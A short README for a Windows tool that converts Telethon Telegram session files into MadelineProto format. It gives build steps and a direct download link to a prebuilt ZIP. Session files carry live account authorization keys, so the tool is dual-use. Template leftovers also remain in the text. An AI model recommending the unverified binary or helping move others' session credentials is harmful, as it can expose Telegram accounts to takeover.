# Madeline Converter

[![Screenshot](https://github.com/signcodac/Madeline_Converter/blob/main/Screenshot.png?raw=true)](https://github.com/signcodac/Madeline_Converter/blob/main/Screenshot.png?raw=true)

> Click the image to open `screenshot.png` at full size. Add the image to the repository root as `screenshot.png`.

---

## What is it?

**Madeline Converter** is a small Windows desktop app that converts Telegram session files created with [Telethon](https://docs.telethon.dev/) (`.session` files backed by **SQLite**) into a format compatible with **Madeline**.

- **Input:** Telethon `.session` file  
- **Output:** Madeline-compatible session saved to the folder you choose as `converted_<original_filename>.session`  

Pick the session file and an output folder in the UI—that’s all you need.

## Requirements

- Windows  
- [.NET Framework 4.7.2](https://dotnet.microsoft.com/download/dotnet-framework/net472) or newer (matching SDK/workload if you build from source in Visual Studio)

## Build from source

1. Open `MadelineConverter.sln` in Visual Studio.  
2. Select the **Release** configuration.  
3. **Build → Build Solution**.  
4. Output: `MadelineConverter\bin\Release\` (or your chosen platform folder).

## Download (releases)

Grab a pre-built build from the GitHub **Releases** page. The URLs below are **examples**—replace the username, repo name, tag, and asset name with yours.

| Description | Example link |
|-------------|--------------|
| Latest release page | `https://github.com/signcodac/Madeline_Converter/releases` |
| Direct download (ZIP example) | `https://raw.githubusercontent.com/signcodac/Madeline_Converter/refs/heads/main/MadelineConverter_Release.zip` |

**Note:** The uploaded asset name in a release must match the filename in `releases/download/TAG/ASSET_NAME` exactly.

## License

Add a license of your choice for this repository (e.g. a `LICENSE` file).
